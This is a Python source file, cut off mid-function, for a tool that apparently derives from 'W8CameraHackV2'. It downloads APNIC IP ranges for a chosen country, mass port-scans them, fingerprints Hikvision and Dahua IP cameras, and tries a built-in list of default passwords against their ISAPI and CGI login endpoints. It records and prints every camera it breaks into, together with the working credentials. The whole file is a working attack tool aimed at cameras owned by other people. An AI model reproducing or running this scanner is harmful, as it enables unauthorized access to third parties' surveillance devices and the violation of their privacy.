import socket
import base64
import time
import sys
import ipaddress
import os
from typing import Optional, Tuple, List
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import requests
from requests.auth import HTTPDigestAuth
import urllib3
from datetime import datetime
import math

# Get script directory for relative file paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# APNIC URL for fetching IP ranges
APNIC_URL = "https://ftp.apnic.net/stats/apnic/delegated-apnic-latest"

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Try to import colorama for colored output
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:
        GREEN = '\033[92m'
        RED = '\033[91m'
        YELLOW = '\033[93m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        MAGENTA = '\033[95m'
    class Style:
        RESET_ALL = '\033[0m'

# Default credentials to try
DEFAULT_CREDENTIALS = [
    ("admin", "admin123"),
    ("admin", "admin1234"),
    ("admin", "admin12345"),
    ("admin", "admin1122"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "password"),
]

# Supported Countries (44 countries from W8CameraHackV2)
COUNTRIES = {
    '1': {'name': 'Afghanistan', 'code': 'AF', 'file': 'AF_IP.txt'},
    '2': {'name': 'Australia', 'code': 'AU', 'file': 'AU_IP.txt'},
    '3': {'name': 'Bangladesh', 'code': 'BD', 'file': 'BD_IP.txt'},
    '4': {'name': 'Brunei', 'code': 'BN', 'file': 'BN_IP.txt'},
    '5': {'name': 'Bhutan', 'code': 'BT', 'file': 'BT_IP.txt'},
    '6': {'name': 'China', 'code': 'CN', 'file': 'CN_IP.txt'},
    '7': {'name': 'Cook Islands', 'code': 'CK', 'file': 'CK_IP.txt'},
    '8': {'name': 'Fiji', 'code': 'FJ', 'file': 'FJ_IP.txt'},
    '9': {'name': 'Micronesia', 'code': 'FM', 'file': 'FM_IP.txt'},
    '10': {'name': 'Guam', 'code': 'GU', 'file': 'GU_IP.txt'},
    '11': {'name': 'Hong Kong', 'code': 'HK', 'file': 'HK_IP.txt'},
    '12': {'name': 'Indonesia', 'code': 'ID', 'file': 'ID_IP.txt'},
    '13': {'name': 'India', 'code': 'IN', 'file': 'IN_IP.txt'},
    '14': {'name': 'Japan', 'code': 'JP', 'file': 'JP_IP.txt'},
    '15': {'name': 'Cambodia', 'code': 'KH', 'file': 'KH_IP.txt'},
    '16': {'name': 'Kiribati', 'code': 'KI', 'file': 'KI_IP.txt'},
    '17': {'name': 'South Korea', 'code': 'KR', 'file': 'KR_IP.txt'},
    '18': {'name': 'Sri Lanka', 'code': 'LK', 'file': 'LK_IP.txt'},
    '19': {'name': 'Laos', 'code': 'LA', 'file': 'LA_IP.txt'},
    '20': {'name': 'Myanmar', 'code': 'MM', 'file': 'MM_IP.txt'},
    '21': {'name': 'Mongolia', 'code': 'MN', 'file': 'MN_IP.txt'},
    '22': {'name': 'Macau', 'code': 'MO', 'file': 'MO_IP.txt'},
    '23': {'name': 'Maldives', 'code': 'MV', 'file': 'MV_IP.txt'},
    '24': {'name': 'Malaysia', 'code': 'MY', 'file': 'MY_IP.txt'},
    '25': {'name': 'New Caledonia', 'code': 'NC', 'file': 'NC_IP.txt'},
    '26': {'name': 'Nepal', 'code': 'NP', 'file': 'NP_IP.txt'},
    '27': {'name': 'Nauru', 'code': 'NR', 'file': 'NR_IP.txt'},
    '28': {'name': 'New Zealand', 'code': 'NZ', 'file': 'NZ_IP.txt'},
    '29': {'name': 'French Polynesia', 'code': 'PF', 'file': 'PF_IP.txt'},
    '30': {'name': 'Papua New Guinea', 'code': 'PG', 'file': 'PG_IP.txt'},
    '31': {'name': 'Philippines', 'code': 'PH', 'file': 'PH_IP.txt'},
    '32': {'name': 'Pakistan', 'code': 'PK', 'file': 'PK_IP.txt'},
    '33': {'name': 'North Korea', 'code': 'KP', 'file': 'KP_IP.txt'},
    '34': {'name': 'Palau', 'code': 'PW', 'file': 'PW_IP.txt'},
    '35': {'name': 'Solomon Islands', 'code': 'SB', 'file': 'SB_IP.txt'},
    '36': {'name': 'Singapore', 'code': 'SG', 'file': 'SG_IP.txt'},
    '37': {'name': 'Thailand', 'code': 'TH', 'file': 'TH_IP.txt'},
    '38': {'name': 'Timor-Leste', 'code': 'TL', 'file': 'TL_IP.txt'},
    '39': {'name': 'Tonga', 'code': 'TO', 'file': 'TO_IP.txt'},
    '40': {'name': 'Taiwan', 'code': 'TW', 'file': 'TW_IP.txt'},
    '41': {'name': 'Vanuatu', 'code': 'VU', 'file': 'VU_IP.txt'},
    '42': {'name': 'Vietnam', 'code': 'VN', 'file': 'VN_IP.txt'},
    '43': {'name': 'Samoa', 'code': 'WS', 'file': 'WS_IP.txt'},
    '44': {'name': 'United States (APNIC)', 'code': 'US', 'file': 'US_IP.txt'},
}

# Global results storage (thread-safe)
results_lock = threading.Lock()
valid_results = []
scanned_count = 0
total_ips = 0
start_time = time.time()
selected_country = None
cctv_output_file = None

# Global counters for scan statistics
found_count = 0
rejected_count = 0  
login_success_count = 0


def ip_range_to_list(start_ip: str, end_ip: str) -> List[str]:
    """
    Convert IP range to list of IP addresses
    
    Args:
        start_ip: Starting IP address (e.g., "192.168.1.1")
        end_ip: Ending IP address (e.g., "192.168.1.255")
    
    Returns:
        List of IP address strings
    """
    try:
        start = ipaddress.IPv4Address(start_ip)
        end = ipaddress.IPv4Address(end_ip)
        
        if start > end:
            start, end = end, start
        
        ip_list = []
        current = start
        while current <= end:
            ip_list.append(str(current))
            current += 1
            if len(ip_list) > 65536:  # Safety limit
                break
        
        return ip_list
    except Exception as e:
        print(f"{Fore.RED}[!] Error parsing IP range: {e}{Style.RESET_ALL}")
        return []


def fast_port_scan(ip: str, ports: List[int], timeout: float = 0.15) -> List[int]:
    """
    Ultra-fast parallel port scanning for an IP address
    
    Args:
        ip: IP address to scan
        ports: List of ports to check
        timeout: Connection timeout per port (default 0.15s for maximum speed)
    
    Returns:
        List of open ports
    """
    open_ports = []
    
    # Scan ports in parallel for maximum speed
    def check_port(port):
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            if result == 0:
                return port
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        return None
    
    # Use ThreadPoolExecutor for parallel port scanning
    with ThreadPoolExecutor(max_workers=len(ports)) as executor:
        results = executor.map(check_port, ports)
        for port in results:
            if port:
                open_ports.append(port)
                # If we found a camera port (80, 443, 554, 37777), stop scanning others for speed
                if port in [80, 443, 554, 37777]:
                    break
    
    return open_ports


def cidr_to_ip_range(cidr_notation: str) -> List[str]:
    """
    Convert CIDR notation (IP/count) to IP range list
    Format from BD_IP.txt: "14.1.100.0/1024"
    """
    try:
        # Parse the custom format: IP/count
        ip_str, count_str = cidr_notation.split('/')
        count = int(count_str)
        
        if count <= 0:
            return []
        
        # Calculate prefix length from count: 32 - log2(count)
        prefix_len = 32 - int(math.log2(count))
        
        # Create network object (strict=False allows non-standard prefixes)
        network = ipaddress.IPv4Network(f"{ip_str}/{prefix_len}", strict=False)
        
        # Return all host IPs (exclude network and broadcast)
        return [str(ip) for ip in network.hosts()]
    except Exception as e:
        return []


def detect_camera_via_http(ip: str, port: int = 80) -> Tuple[bool, str]:
    """
    Fast camera detection via HTTP response check
    Returns: (found: bool, camera_type: str)
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(0.5)  # Very short timeout
            sock.connect((ip, port))
            sock.send(b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')
            response = sock.recv(4096).decode(errors='ignore')
            
            if 'HTTP' in response:
                if '<title>WEB SERVICE</title>' in response or 'web service' in response.lower():
                    return True, "Anjhua-Dahua Technology Camera"
                elif 'login.asp' in response.lower() or '/isapi/' in response.lower() or 'hikvision' in response.lower():
                    return True, "HIK Vision Camera"
            
            return False, ""
    except:
        return False, ""


class HikvisionCameraValidator:
    """Validates Hikvision camera password using ISAPI protocol"""
    
    HTTP_PORT = 80
    HTTPS_PORT = 443
    ALT_HTTP_PORT = 8000
    
    DEVICE_INFO_ENDPOINT = "/ISAPI/System/deviceInfo"
    SYSTEM_CAPABILITIES = "/ISAPI/System/capabilities"
    USER_INFO_ENDPOINT = "/ISAPI/Security/users/1"
    
    def __init__(self, ip_address: str, username: str, password: str, port: int = 80):
        self.ip_address = ip_address
        self.username = username
        self.password = password
        self.port = port
        self.timeout = 1.5  # Ultra-short timeout for maximum speed
    
    def validate_via_isapi_digest(self, endpoint: str = None) -> Tuple[bool, str]:
        """Validate password via ISAPI with HTTP Digest Authentication (fast)"""
        if endpoint is None:
            endpoint = self.DEVICE_INFO_ENDPOINT
        
        # Only try HTTP first (most common), skip HTTPS for speed
        for protocol in ['http']:
            test_ports = [self.port]
            if self.port == self.HTTP_PORT and self.port != 8080:
                test_ports = [self.port]  # Only try one port for speed
            
            for test_port in test_ports[:1]:  # Only try first port for speed
                try:
                    url = f"{protocol}://{self.ip_address}:{test_port}{endpoint}"
                    
                    # Use very short timeout
                    response = requests.get(
                        url,
                        auth=HTTPDigestAuth(self.username, self.password),
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=False  # No redirects for speed
                    )
                    
                    if response.status_code == 200:
                        return True, f"Authentication successful via {protocol} on port {test_port}"
                    elif response.status_code == 401:
                        return False, "Authentication failed - invalid credentials"
                    # 404 or other = not this endpoint, continue
                except requests.exceptions.Timeout:
                    return False, "Timeout"
                except requests.exceptions.ConnectionError:
                    return False, "Connection failed"
                except Exception:
                    return False, "Error"
        
        return False, "ISAPI authentication not available"
    
    def validate_via_multiple_endpoints(self) -> Tuple[bool, str]:
        """Try multiple ISAPI endpoints to validate password"""
        # Only try first endpoint for speed (most reliable)
        endpoint = self.DEVICE_INFO_ENDPOINT
        success, message = self.validate_via_isapi_digest(endpoint)
        if success:
            return True, message
        elif "401" in message or "Authentication failed" in message:
            return False, message
        
        return False, "All ISAPI endpoints failed"
    
    def validate(self) -> Tuple[bool, str]:
        """Main validation method for Hikvision cameras (fast - single endpoint)"""
        # Try only first endpoint for maximum speed
        success, message = self.validate_via_isapi_digest(self.DEVICE_INFO_ENDPOINT)
        return success, message


class DahuaCameraValidator:
    """Validates Dahua/Anjhua camera password"""
    
    SDK_PORT = 37777
    HTTP_PORT = 80
    HTTPS_PORT = 443
    RTSP_PORT = 554
    
    def __init__(self, ip_address: str, username: str, password: str, port: int = 80):
        self.ip_address = ip_address
        self.username = username
        self.password = password
        self.port = port
        self.timeout = 1.5  # Ultra-short timeout for maximum speed
    
    def validate_via_http_api(self) -> Tuple[bool, str]:
        """Attempt to validate password via HTTP/HTTPS API (fast)"""
        # Only try HTTP on main port for speed
        protocol = 'http'
        test_port = self.port
        
        # Try only first endpoint for speed (most reliable)
        endpoint = "/cgi-bin/magicBox.cgi?action=getDeviceType"
        
        try:
            url = f"{protocol}://{self.ip_address}:{test_port}{endpoint}"
            response = requests.get(
                url,
                timeout=self.timeout,
                verify=False,
                auth=HTTPDigestAuth(self.username, self.password),
                allow_redirects=False  # No redirects for speed
            )
            
            if response.status_code == 200:
                return True, f"Authentication successful via {protocol} on port {test_port}"
            elif response.status_code == 401:
                return False, "Authentication failed - invalid credentials"
        except requests.exceptions.Timeout:
            return False, "Timeout"
        except requests.exceptions.ConnectionError:
            return False, "Connection failed"
        except Exception:
            return False, "Error"
        
        return False, "HTTP API authentication not available"
    
    def validate_via_rtsp(self) -> Tuple[bool, str]:
        """Attempt to validate password via RTSP connection"""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.ip_address, self.RTSP_PORT))
            
            rtsp_url = f"rtsp://{self.ip_address}:{self.RTSP_PORT}/cam/realmonitor?channel=1&subtype=0"
            request = f"DESCRIBE {rtsp_url} RTSP/1.0\r\n"
            request += f"CSeq: 1\r\n"
            request += f"Authorization: Basic {base64.b64encode(f'{self.username}:{self.password}'.encode()).decode()}\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            sock.settimeout(self.timeout)
            response = sock.recv(4096).decode(errors='ignore')
            
            if "200 OK" in response:
                return True, "RTSP authentication successful"
            elif "401" in response or "Unauthorized" in response:
                return False, "RTSP authentication failed - invalid credentials"
        except socket.timeout:
            pass
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        
        return False, "RTSP authentication not available"
    
    def validate(self) -> Tuple[bool, str]:
        """Main validation method for Dahua cameras (fast)"""
        # Try HTTP API only (skip RTSP for speed)
        success, message = self.validate_via_http_api()
        return success, message


def scan_single_ip_detection_only(ip: str, ports: List[int]) -> Optional[dict]:
    """
    Fast camera detection only (no login attempt) - Phase 1
    Returns camera info if found, None otherwise
    """
    global scanned_count, total_ips, cctv_output_file, found_count, rejected_count
    
    try:
        # Show IP being scanned with counters
        with results_lock:
            current = scanned_count + 1
            total = total_ips
            found = found_count
            rejected = rejected_count
        print(f"{Fore.CYAN}[*] [{current}/{total}] Scanning: {ip} | Found: {Fore.GREEN}{found}{Fore.CYAN} | Rejected: {Fore.RED}{rejected}{Fore.CYAN}{Style.RESET_ALL}", end='\r', flush=True)
        
        # Fast port scan first
        open_ports = fast_port_scan(ip, ports, timeout=0.15)
        
        if not open_ports:
            with results_lock:
                scanned_count += 1
                rejected_count += 1
            return None
        
        # Check camera ports (80, 8080 are most common)
        camera_ports = [p for p in open_ports if p in [80, 443, 554, 37777, 8000, 8080]]
        
        if not camera_ports:
            with results_lock:
                scanned_count += 1
                rejected_count += 1
            return None
        
        # Fast camera detection via HTTP
        detected_port = camera_ports[0]
        camera_found, camera_type = detect_camera_via_http(ip, detected_port)
        
        # If detection failed on first port, try other ports
        if not camera_found and len(camera_ports) > 1:
            for port in camera_ports[1:]:
                camera_found, camera_type = detect_camera_via_http(ip, port)
                if camera_found:
                    detected_port = port
                    break
        
        # If still not detected, assume based on port
        if not camera_found:
            if detected_port in [37777, 554]:
                camera_type = "Anjhua-Dahua Technology Camera"
                camera_found = True
        
        if camera_found and camera_type and camera_type != "Unknown Camera" and camera_type not in ["", "Unknown"]:
            # Save camera detection info immediately
            url = f"http://{ip}:{detected_port}" if detected_port == 8080 else f"http://{ip}"
            detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            if cctv_output_file:
                try:
                    with open(cctv_output_file, 'a', encoding='utf-8') as file:
                        file.write(f"{'='*60}\n")
                        file.write(f"Camera Type: {camera_type}\n")
                        file.write(f"IP Address: {ip}\n")
                        file.write(f"Port: {detected_port}\n")
                        file.write(f"URL: {url}\n")
                        file.write(f"Detection Time: {detection_time}\n")
                        file.write(f"{'='*60}\n\n")
                        file.flush()
                except:
                    pass
            
            # Update counters and display found result
            with results_lock:
                scanned_count += 1
                found_count += 1
                current = scanned_count
                total = total_ips
                found = found_count
                rejected = rejected_count
            
            # Display the found camera with full info
            print()  # New line after progress message
            print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[✓] CAMERA FOUND!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
            print(f"    Camera Type: {Fore.YELLOW}{camera_type}{Style.RESET_ALL}")
            print(f"    IP Address: {Fore.CYAN}{ip}{Style.RESET_ALL}")
            print(f"    Port: {Fore.MAGENTA}{detected_port}{Style.RESET_ALL}")
            print(f"    URL: {Fore.CYAN}{url}{Style.RESET_ALL}")
            print(f"    Detection Time: {Fore.YELLOW}{detection_time}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
            print(f"    Status: Found: {Fore.GREEN}{found}{Fore.CYAN} | Rejected: {Fore.RED}{rejected}{Fore.CYAN} | Total: {current}/{total}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}\n")
            
            return {
                'ip': ip,
                'camera_type': camera_type,
                'port': detected_port,
                'url': url,
                'open_ports': open_ports
            }
        
        # Rejected - no camera found
        with results_lock:
            scanned_count += 1
            rejected_count += 1
        return None
        
    except Exception as e:
        with results_lock:
            scanned_count += 1
            rejected_count += 1
        return None


def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], ports: List[int]) -> Optional[dict]:
    """
    Scan IP for camera detection then try login
    """
    global scanned_count, total_ips, cctv_output_file, found_count, rejected_count, login_success_count
    
    try:
        # Show IP being scanned with counters
        with results_lock:
            current = scanned_count + 1
            total = total_ips
            found = found_count
            rejected = rejected_count
            login_success = login_success_count
        print(f"{Fore.CYAN}[*] [{current}/{total}] Scanning: {ip} | Found: {Fore.GREEN}{found}{Fore.CYAN} | Rejected: {Fore.RED}{rejected}{Fore.CYAN} | Login Success: {Fore.GREEN}{login_success}{Fore.CYAN}{Style.RESET_ALL}", end='\r', flush=True)
        
        # Fast port scan first
        open_ports = fast_port_scan(ip, ports, timeout=0.15)
        
        if not open_ports:
            with results_lock:
                scanned_count += 1
                rejected_count += 1
            return None
        
        # Check camera ports
        camera_ports = [p for p in open_ports if p in [80, 443, 554, 37777, 8000, 8080]]
        
        if not camera_ports:
            with results_lock:
                scanned_count += 1
                rejected_count += 1
            return None
        
        # Fast camera detection via HTTP
        detected_port = camera_ports[0]
        camera_found, camera_type = detect_camera_via_http(ip, detected_port)
        
        # If detection failed on first port, try other ports
        if not camera_found and len(camera_ports) > 1:
            for port in camera_ports[1:]:
                camera_found, camera_type = detect_camera_via_http(ip, port)
                if camera_found:
                    detected_port = port
                    break
        
        # If still not detected, assume based on port
        if not camera_found:
            if detected_port in [37777, 554]:
                camera_type = "Anjhua-Dahua Technology Camera"
                camera_found = True
            elif detected_port in [80, 443, 8000, 8080]:
                camera_found = True
        
        if camera_found:
            url = f"http://{ip}:{detected_port}" if detected_port == 8080 else f"http://{ip}"
            detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Only save and display if camera type is confirmed
            if camera_type and camera_type != "Unknown Camera" and camera_type not in ["", "Unknown"]:
                # Save camera detection info
                if cctv_output_file:
                    try:
                        with open(cctv_output_file, 'a', encoding='utf-8') as file:
                            file.write(f"{'='*60}\n")
                            file.write(f"Camera Type: {camera_type}\n")
                            file.write(f"IP Address: {ip}\n")
                            file.write(f"Port: {detected_port}\n")
                            file.write(f"URL: {url}\n")
                            file.write(f"Detection Time: {detection_time}\n")
                            file.write(f"{'='*60}\n\n")
                            file.flush()
                    except:
                        pass
                
                # Update counters and display found
                with results_lock:
                    found_count += 1
                    current = scanned_count + 1
                    total = total_ips
                    found = found_count
                    rejected = rejected_count
                    login_success = login_success_count
                
                print()  # New line after progress message
                print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[✓] CAMERA DETECTED!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                print(f"    Camera Type: {Fore.YELLOW}{camera_type}{Style.RESET_ALL}")
                print(f"    IP Address: {Fore.CYAN}{ip}{Style.RESET_ALL}")
                print(f"    Port: {Fore.MAGENTA}{detected_port}{Style.RESET_ALL}")
                print(f"    URL: {Fore.CYAN}{url}{Style.RESET_ALL}")
                print(f"    Detection Time: {Fore.YELLOW}{detection_time}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                print(f"    Status: Found: {Fore.GREEN}{found}{Fore.CYAN} | Rejected: {Fore.RED}{rejected}{Fore.CYAN} | Login Success: {Fore.GREEN}{login_success}{Fore.CYAN} | Total: {current}/{total}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}\n")
            else:
                # Camera port found but type unknown - try login
                print()  # New line after progress message
                print(f"{Fore.YELLOW}[*] Camera port found at {ip}:{detected_port}, detecting type via login...{Style.RESET_ALL}")
            
            # Try login credentials
            is_dahua = (camera_type and ("Dahua" in camera_type or "Anjhua" in camera_type)) or detected_port in [37777, 554]
            
            for username, password in credentials:
                if is_dahua:
                    validator = DahuaCameraValidator(ip, username, password, detected_port)
                    validator.timeout = 1.5
                    success, message = validator.validate()
                    if success:
                        if not camera_type or camera_type == "Unknown Camera" or camera_type == "Unknown":
                            camera_type = "Anjhua-Dahua Technology Camera"
                        
                        # Save detection info
                        detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        if cctv_output_file:
                            try:
                                with open(cctv_output_file, 'a', encoding='utf-8') as file:
                                    file.write(f"{'='*60}\n")
                                    file.write(f"Camera Type: {camera_type}\n")
                                    file.write(f"IP Address: {ip}\n")
                                    file.write(f"Port: {detected_port}\n")
                                    file.write(f"URL: {url}\n")
                                    file.write(f"Detection Time: {detection_time}\n")
                                    file.write(f"{'='*60}\n\n")
                                    file.flush()
                            except:
                                pass
                        
                        with results_lock:
                            scanned_count += 1
                            found_count += 1
                            login_success_count += 1
                            valid_results.append({
                                'ip': ip,
                                'username': username,
                                'password': password,
                                'camera_type': camera_type,
                                'port': detected_port,
                                'message': message,
                                'open_ports': open_ports,
                                'url': url
                            })
                            current = scanned_count
                            total = total_ips
                            found = found_count
                            rejected = rejected_count
                            login_success = login_success_count
                        
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[✓] LOGIN SUCCESS!{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                        print(f"    Camera Type: {Fore.YELLOW}{camera_type}{Style.RESET_ALL}")
                        print(f"    IP Address: {Fore.CYAN}{ip}{Style.RESET_ALL}")
                        print(f"    Port: {Fore.MAGENTA}{detected_port}{Style.RESET_ALL}")
                        print(f"    Username: {Fore.GREEN}{username}{Style.RESET_ALL}")
                        print(f"    Password: {Fore.GREEN}{password}{Style.RESET_ALL}")
                        print(f"    URL: {Fore.CYAN}{url}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                        print(f"    Status: Found: {Fore.GREEN}{found}{Fore.CYAN} | Rejected: {Fore.RED}{rejected}{Fore.CYAN} | Login Success: {Fore.GREEN}{login_success}{Fore.CYAN} | Total: {current}/{total}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}\n")
                        return {
                            'ip': ip,
                            'username': username,
                            'password': password,
                            'camera_type': camera_type,
                            'port': detected_port,
                            'message': message,
                            'open_ports': open_ports,
                            'url': url
                        }
                else:
                    # Try Hikvision first
                    validator = HikvisionCameraValidator(ip, username, password, detected_port)
                    validator.timeout = 1.5
                    success, message = validator.validate()
                    if success:
                        camera_type = "HIK Vision Camera"
                        
                        detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        if cctv_output_file:
                            try:
                                with open(cctv_output_file, 'a', encoding='utf-8') as file:
                                    file.write(f"{'='*60}\n")
                                    file.write(f"Camera Type: {camera_type}\n")
                                    file.write(f"IP Address: {ip}\n")
                                    file.write(f"Port: {detected_port}\n")
                                    file.write(f"URL: {url}\n")
                                    file.write(f"Detection Time: {detection_time}\n")
                                    file.write(f"{'='*60}\n\n")
                                    file.flush()
                            except:
                                pass
                        
                        with results_lock:
                            scanned_count += 1
                            found_count += 1
                            login_success_count += 1
                            valid_results.append({
                                'ip': ip,
                                'username': username,
                                'password': password,
                                'camera_type': camera_type,
                                'port': detected_port,
                                'message': message,
                                'open_ports': open_ports,
                                'url': url
                            })
                            current = scanned_count
                            total = total_ips
                            found = found_count
                            rejected = rejected_count
                            login_success = login_success_count
                        
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[✓] LOGIN SUCCESS!{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                        print(f"    Camera Type: {Fore.YELLOW}{camera_type}{Style.RESET_ALL}")
                        print(f"    IP Address: {Fore.CYAN}{ip}{Style.RESET_ALL}")
                        print(f"    Port: {Fore.MAGENTA}{detected_port}{Style.RESET_ALL}")
                        print(f"    Username: {Fore.GREEN}{username}{Style.RESET_ALL}")
                        print(f"    Password: {Fore.GREEN}{password}{Style.RESET_ALL}")
                        print(f"    URL: {Fore.CYAN}{url}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                        print(f"    Status: Found: {Fore.GREEN}{found}{Fore.CYAN} | Rejected: {Fore.RED}{rejected}{Fore.CYAN} | Login Success: {Fore.GREEN}{login_success}{Fore.CYAN} | Total: {current}/{total}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}\n")
                        return {
                            'ip': ip,
                            'username': username,
                            'password': password,
                            'camera_type': camera_type,
                            'port': detected_port,
                            'message': message,
                            'open_ports': open_ports,
                            'url': url
                        }
                    
                    # Try Dahua as fallback
                    validator = DahuaCameraValidator(ip, username, password, detected_port)
                    validator.timeout = 1.5
                    success, message = validator.validate()
                    if success:
                        camera_type = "Anjhua-Dahua Technology Camera"
                        
                        detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        if cctv_output_file:
                            try:
                                with open(cctv_output_file, 'a', encoding='utf-8') as file:
                                    file.write(f"{'='*60}\n")
                                    file.write(f"Camera Type: {camera_type}\n")
                                    file.write(f"IP Address: {ip}\n")
                                    file.write(f"Port: {detected_port}\n")
                                    file.write(f"URL: {url}\n")
                                    file.write(f"Detection Time: {detection_time}\n")
                                    file.write(f"{'='*60}\n\n")
                                    file.flush()
                            except:
                                pass
                        
                        with results_lock:
                            scanned_count += 1
                            found_count += 1
                            login_success_count += 1
                            valid_results.append({
                                'ip': ip,
                                'username': username,
                                'password': password,
                                'camera_type': camera_type,
                                'port': detected_port,
                                'message': message,
                                'open_ports': open_ports,
                                'url': url
                            })
                            current = scanned_count
                            total = total_ips
                            found = found_count
                            rejected = rejected_count
                            login_success = login_success_count
                        
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[✓] LOGIN SUCCESS!{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                        print(f"    Camera Type: {Fore.YELLOW}{camera_type}{Style.RESET_ALL}")
                        print(f"    IP Address: {Fore.CYAN}{ip}{Style.RESET_ALL}")
                        print(f"    Port: {Fore.MAGENTA}{detected_port}{Style.RESET_ALL}")
                        print(f"    Username: {Fore.GREEN}{username}{Style.RESET_ALL}")
                        print(f"    Password: {Fore.GREEN}{password}{Style.RESET_ALL}")
                        print(f"    URL: {Fore.CYAN}{url}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
                        print(f"    Status: Found: {Fore.GREEN}{found}{Fore.CYAN} | Rejected: {Fore.RED}{rejected}{Fore.CYAN} | Login Success: {Fore.GREEN}{login_success}{Fore.CYAN} | Total: {current}/{total}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}\n")
                        return {
                            'ip': ip,
                            'username': username,
                            'password': password,
                            'camera_type': camera_type,
                            'port': detected_port,
                            'message': message,
                            'open_ports': open_ports,
                            'url': url
                        }
            
            # Camera found but no valid credentials
            with results_lock:
                scanned_count += 1
                rejected_count += 1
                current = scanned_count
                total = total_ips
                found = found_count
                rejected = rejected_count
                login_success = login_success_count
            print(f"{Fore.YELLOW}[-] No valid credentials found for {ip}{Style.RESET_ALL}")
            print(f"    Status: Found: {Fore.GREEN}{found}{Fore.CYAN} | Rejected: {Fore.RED}{rejected}{Fore.CYAN} | Login Success: {Fore.GREEN}{login_success}{Fore.CYAN} | Total: {current}/{total}{Style.RESET_ALL}\n")
            return None
        
        # Rejected - no camera found
        with results_lock:
            scanned_count += 1
            rejected_count += 1
        return None
        
    except Exception as e:
        with results_lock:
            scanned_count += 1
            rejected_count += 1
        return None


def print_country_menu():
    """Display country selection menu"""
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Select Country (Total: {len(COUNTRIES)} Countries):{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    # Display in 3 columns for better organization
    countries_list = list(COUNTRIES.items())
    rows = (len(countries_list) + 2) // 3  # 3 columns
    
    for i in range(rows):
        row_str = ""
        for col in range(3):
            idx = i + (col * rows)
            if idx < len(countries_list):
                country = countries_list[idx]
                col_str = f"{Fore.YELLOW}{country[0]:2s}.{Style.RESET_ALL} {country[1]['name']:<22}"
                row_str += col_str
        print(f"  {row_str}")
    
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")


def fetch_country_ipv4_from_apnic(country_code: str) -> List[str]:
    """Fetch IPv4 ranges for specified country from APNIC"""
    ipv4_list = []
    
    if not country_code:
        print(f"{Fore.RED}[!] No country code provided!{Style.RESET_ALL}")
        return []
    
    try:
        print(f"{Fore.YELLOW}[*] Connecting to APNIC server...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[i] Fetching IP ranges for: {Fore.YELLOW}{country_code}{Style.RESET_ALL}")
        
        response = requests.get(APNIC_URL, timeout=60, stream=True)
        response.raise_for_status()
        
        print(f"{Fore.GREEN}[✓] Connected successfully!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Downloading and parsing data...{Style.RESET_ALL}\n")
        
        line_count = 0
        for line_bytes in response.iter_lines(decode_unicode=True):
            line = line_bytes.strip() if isinstance(line_bytes, str) else line_bytes.decode('utf-8', errors='ignore').strip()
            
            if not line or line.startswith('#'):
                continue
            
            parts = line.split('|')
            
            # Filter country IPv4 entries
